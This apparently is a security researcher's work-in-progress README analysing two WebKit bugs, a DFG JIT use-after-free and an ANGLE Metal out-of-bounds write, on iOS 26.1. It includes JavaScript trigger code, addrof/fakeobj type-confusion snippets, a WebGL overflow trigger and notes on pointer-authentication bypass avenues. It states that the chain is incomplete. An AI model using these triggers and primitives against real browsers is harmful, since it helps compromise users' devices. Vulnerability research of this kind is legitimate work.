# WebKit-UAF-ANGLE-OOB-Analysis (CVE-2025-43529, CVE-2025-14174)

Notes and PoC material for a WebKit/ANGLE chain on iOS 26.1. This repo is not a full exploit; it tracks the pieces that are verified and the parts that are still failing.

**Author:** [zeroxjf](https://x.com/zeroxjf)<br>
**Based on:** [jir4vv1t's CVE-2025-43529 exploit](https://github.com/jir4vv1t/CVE-2025-43529)<br>
**Status:** Work in progress<br>
**Test Device:** iPhone 11 Pro Max, iOS 26.1<br>
**Last Updated:** January 2026

---

## Scope and credit

The CVE-2025-43529 UAF trigger, butterfly reclaim, and `addrof`/`fakeobj` primitives are based on **[jir4vv1t's work](https://github.com/jir4vv1t/CVE-2025-43529)**. My additions are the ANGLE OOB plumbing, PAC-focused analysis, and iOS 26.1 validation.

Note: AI assisted with probe analysis; findings were manually validated before publication.
---

## Overview

Two WebKit CVEs disclosed together and reported as in-the-wild use by Apple.

| CVE | Component | Type | Summary |
|-----|-----------|------|---------|
| CVE-2025-43529 | JavaScriptCore | Use-After-Free | DFG JIT missing write barrier leads to GC freeing live objects |
| CVE-2025-14174 | ANGLE (GPU) | Out-of-Bounds Write | Metal backend uses wrong height for staging buffer allocation |

---

## CVE-2025-43529: WebKit DFG Store Barrier UAF

### Root Cause

The bug is in JavaScriptCore's DFG JIT, specifically the **Store Barrier Insertion Phase** (`DFGStoreBarrierInsertionPhase.cpp`).

When a **Phi node escapes** but its **Upsilon inputs are not marked as escaped**, later stores miss a write barrier. That allows GC to free objects that are still reachable.

### Trigger Mechanism

```javascript
function triggerUAF(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A;  // A in old space

    let a = new Date(1111);
    a[0] = 1.1;  // Creates butterfly for Date

    // Force GC
    for (let j = 0; j < allocCount; ++j) {
        forGC.push(new ArrayBuffer(0x800000));
    }

    let b = { p0: 0x42424242, p1: 1.1 };

    // Phi node - the bug
    let f = b;
    if (flag) f = 1.1;

    A.p1 = f;  // Phi escapes, but 'b' NOT marked as escaped

    // Long loop = GC race window
    for (let i = 0; i < 1e6; ++i) { /* ... */ }

    b.p1 = a;  // NO WRITE BARRIER - 'a' freed while still reachable
}
```

### Exploitation sketch

The freed Date's butterfly can be reclaimed by spray arrays, creating a type confusion:

```javascript
// After reclaim:
boxed_arr[0] = obj;           // Store object reference
addr = ftoi(unboxed_arr[0]);  // Read as float64 = leaked address

unboxed_arr[0] = itof(addr);  // Write address as float64
fake = boxed_arr[0];          // Read as object = fakeobj
```

### Current results (iPhone 11 Pro Max, iOS 26.1)

- **addrof/fakeobj:** Verified in probe runs
- **Address leaking:** 20+ object addresses captured per run
- **Inline-storage read/write:** Verified against known inline slots (object-address-based)
- **Arbitrary R/W:** Not proven; backing-store scan proof fails in current runs

---

## CVE-2025-14174: ANGLE Metal Backend OOB Write

### Root cause

In ANGLE's Metal backend (`TextureMtl.cpp`), staging buffer allocation uses `UNPACK_IMAGE_HEIGHT` instead of actual texture height when uploading via PBO.

### Trigger

```javascript
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // Small value

// Staging buffer: 256 * 16 * 4 = 16KB
// Actual write:   256 * 256 * 4 = 256KB
// OOB: 240KB!

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
              256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```

---

## The PAC problem

### What's blocking full exploitation

On arm64e (iPhone 11 Pro Max), **Pointer Authentication Codes** protect critical JSC pointers:

| Pointer | Protected | Result |
|---------|-----------|--------|
| TypedArray `m_vector` | Yes | Cannot fake TypedArray with arbitrary backing store |
| JSArray `butterfly` | Yes | Cannot fake JSArray with arbitrary butterfly |

When I try to create a fake TypedArray/JSArray with an arbitrary data pointer, PAC verification fails and crashes:

```
Exception: EXC_BAD_ACCESS
KERN_INVALID_ADDRESS at 0x0001fffffffffffc -> 0x0000007ffffffffc
(possible pointer authentication failure)
```

### Why the original confusion works

The type confusion succeeds because both arrays use **legitimately signed** butterfly pointers - we're just reinterpreting the same memory. Fake objects with arbitrary unsigned pointers crash on PAC check.

### Potential bypass avenues

1. JIT code paths that might skip authentication
2. Gadgets that sign arbitrary pointers
3. Leveraging the ANGLE OOB differently
4. Alternative primitives that don't require fake objects

---

## Current capabilities

| Primitive | Status | Notes |
|-----------|--------|-------|
| `addrof(obj)` | **Working** | Verified in probe |
| `fakeobj(addr)` | **Working** | Verified against known objects |
| Address leaking | **Working** | 20+ addresses per run |
| Inline slot read/write | **Working** | Verified on known inline slots (object-address-based) |
| `read64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |
| `write64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |

---

## Evidence summary (latest probe run)

- **Verified:** `addrof`, `fakeobj`, address leaks, inline-slot read/write on known objects
- **Unverified:** arbitrary `read64`/`write64`, renderer→GPU escape chain, sandbox escape
- **ANGLE probe:** WebGL2 PBO path implemented; trigger not confirmed in current runs

---

## Repository structure

```
├── README.md                 # This file
├── poc/
│   └── chained_exploit_probe.html
└── analysis/
    ├── pac_analysis.md       # Detailed PAC findings
    └── crash_logs/           # Example crash reports
```

---

## Acknowledgments

The CVE-2025-43529 UAF trigger, butterfly reclaim technique, and `addrof`/`fakeobj` primitive construction are based on the work of **[jir4vv1t](https://github.com/jir4vv1t/CVE-2025-43529)**. Their detailed analysis of the DFG Store Barrier bug and race condition exploitation was instrumental to this research.

---

## References

- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529) - Original UAF exploit and analysis
- WebKit Bugzilla: 302502, 303614
- Apple Security Updates - iOS 26
- Google Threat Analysis Group

---

**Work in progress.**
